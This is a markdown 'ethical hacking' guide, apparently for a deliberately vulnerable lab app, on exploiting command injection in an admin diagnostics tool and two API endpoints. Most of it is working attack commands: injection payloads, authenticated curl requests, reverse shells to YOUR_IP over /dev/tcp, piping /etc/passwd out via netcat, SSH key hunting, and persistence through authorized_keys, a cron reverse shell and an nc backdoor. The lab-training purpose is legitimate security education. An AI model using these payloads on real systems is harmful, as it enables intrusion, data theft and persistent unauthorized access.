# Ethical Hacking Setup Guide

## Quick Start for Vulnerability Testing

### Prerequisites
1. Admin access to the application
2. Basic understanding of command injection
3. Network access to the target server
4. Tools: `curl`, `netcat`, browser developer tools

### Multiple Attack Vectors

This application contains **three separate RCE vulnerabilities** for comprehensive testing:

1. **Primary UI-based attack** - System Diagnostics interface
2. **Hidden API endpoint** - System Info with cmd parameter
3. **Network tools API** - Command injection in network utilities

### Steps to Exploit the RCE

#### 1. Access the Vulnerable Feature (UI Method)
1. Log in with admin credentials
2. Navigate to `/admin`
3. Click on the **"System Diagnostics"** tab
4. You'll see a network diagnostic tool

#### 2. Identify the Vulnerability
**Look for these indicators:**
- Warning message: "⚠️ Note: This tool directly executes system commands on the server"
- User-controlled input field for "Target Host/IP"
- Multiple command options (ping, traceroute, etc.)
- Raw command output display

#### 3. Test Basic Command Injection (UI Method)

Start with simple tests in the "Target Host/IP" field:

```bash
# Test 1: Basic command separation
8.8.8.8; whoami

# Test 2: Command chaining
8.8.8.8 && id

# Test 3: Pipe command
8.8.8.8 | ls -la
```

#### 4. Direct API Exploitation (Advanced)

**Method 1: Hidden System Info Endpoint**
```bash
# Get your auth token from browser developer tools
TOKEN="your-jwt-token-here"

# Basic command execution
curl -X GET "http://target:5000/admin/system-info?cmd=whoami" \
     -H "Authorization: Bearer $TOKEN"

# File system enumeration
curl -X GET "http://target:5000/admin/system-info?cmd=ls%20-la%20/" \
     -H "Authorization: Bearer $TOKEN"

# Environment variables
curl -X GET "http://target:5000/admin/system-info?cmd=env" \
     -H "Authorization: Bearer $TOKEN"
```

**Method 2: Network Tools Endpoint**
```bash
# Command injection in host parameter
curl -X GET "http://target:5000/admin/network?tool=connectivity&host=8.8.8.8;whoami" \
     -H "Authorization: Bearer $TOKEN"

# Multiple command execution
curl -X GET "http://target:5000/admin/network?tool=portscan&host=127.0.0.1;id;pwd&port=80" \
     -H "Authorization: Bearer $TOKEN"
```

#### 5. Escalate to System Access

Once basic injection works, try:

```bash
# View system information
8.8.8.8; uname -a

# List current directory
8.8.8.8; pwd && ls -la

# Check running processes
8.8.8.8; ps aux

# Find sensitive files
8.8.8.8; find / -name "*.conf" 2>/dev/null | head -10

# Check user privileges
8.8.8.8; sudo -l

# Network configuration
8.8.8.8; ifconfig || ip addr show
```

#### 6. Establish Persistent Access

**Set up a listener first:**
```bash
# Basic netcat listener
nc -lvp 4444

# Enhanced listener with proper terminal
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Using Metasploit
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST YOUR_IP; set LPORT 4444; exploit"
```

**Reverse shell via UI:**
```bash
8.8.8.8; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

**Reverse shell via API:**
```bash
# URL encode the payload
curl -X GET "http://target:5000/admin/system-info?cmd=bash%20-i%20%3E%26%20/dev/tcp/YOUR_IP/4444%200%3E%261" \
     -H "Authorization: Bearer $TOKEN"
```

### Advanced Exploitation Techniques

#### Data Exfiltration
```bash
# Sensitive file access
8.8.8.8; cat /etc/passwd | nc YOUR_IP 4445

# Database config files
8.8.8.8; find / -name "*.env" -o -name "config.js" -o -name "database.yml" 2>/dev/null

# SSH keys
8.8.8.8; find /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
```

#### Persistence Methods
```bash
# Add SSH key
8.8.8.8; echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys

# Cron job persistence
8.8.8.8; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'" | crontab -

# Simple backdoor
8.8.8.8; echo '#!/bin/bash
nc -e /bin/bash YOUR_IP 4444' > /tmp/.backdoor && chmod +x /tmp/.backdoor
```

### Testing Methodology

1. **Reconnaissance:** 
   - Explore the admin interface
   - Identify all input fields and API endpoints
   - Check developer tools for API calls

2. **Discovery:** 
   - Test for command injection with simple payloads
   - Try different endpoints and parameters
   - Look for error messages revealing system information

3. **Exploitation:** 
   - Use successful injection methods to execute commands
   - Test both UI and direct API approaches
   - Document which methods work best

4. **Post-exploitation:** 
   - Explore the system and gather information
   - Attempt privilege escalation
   - Test persistence mechanisms

5. **Documentation:** 
   - Record all successful payloads
   - Note different attack vectors
   - Document defensive measures encountered

### Common Payloads to Try

```bash
# Command separators
; whoami
&& id
|| id
| id

# Command substitution
$(whoami)
`id`
${hostname}

# File operations
; cat /etc/passwd
; ls /home
; find /var -name "*.log" 2>/dev/null

# Network reconnaissance
; netstat -tulpn
; ss -tulpn
; cat /proc/net/tcp

# Process enumeration
; ps aux --sort=-%cpu
; top -bn1 | head -20

# System information
; uname -a && cat /etc/os-release
; lscpu && free -h
; df -h && mount
```

### URL Encoding for API Exploitation

When using curl for API attacks, remember to URL encode special characters:

```bash
# Space: %20
# Ampersand: %26
# Pipe: %7C
# Semicolon: %3B
# Greater than: %3E
# Less than: %3C
```

### Pro Tips

1. **Start Small:** Begin with simple commands like `whoami` or `id`
2. **Use Multiple Methods:** Try both UI and direct API exploitation
3. **URL Encode Payloads:** When using curl, properly encode special characters
4. **Check Different Endpoints:** Test all available admin endpoints
5. **Monitor Network Traffic:** Use browser dev tools to understand API calls
6. **Error Analysis:** Pay attention to error messages for debugging injection attempts
7. **Timing Attacks:** Some payloads might take time to execute (like reverse shells)

### Getting Your Auth Token

To use the API endpoints directly:

1. Open browser developer tools (F12)
2. Go to Application/Storage → Cookies
3. Find the JWT token cookie (usually named something like `mcToken`)
4. Copy the token value for use in curl commands

### Learning Goals

- Understand how command injection vulnerabilities work
- Practice identifying vulnerable input fields and API endpoints
- Learn various command injection techniques (UI and API-based)
- Experience post-exploitation enumeration and persistence
- Understand the impact of RCE vulnerabilities
- Learn to use multiple attack vectors for the same vulnerability class

### Safety Reminders

⚠️ **This is a controlled environment for learning**
- Only test on systems you own or have explicit permission to test
- Never use these techniques on production systems without authorization
- Always follow responsible disclosure practices
- Document your learning process

---

**Happy Ethical Hacking! 🎯**

For detailed exploitation examples and mitigation strategies, see `VULNERABILITY_README.md`. 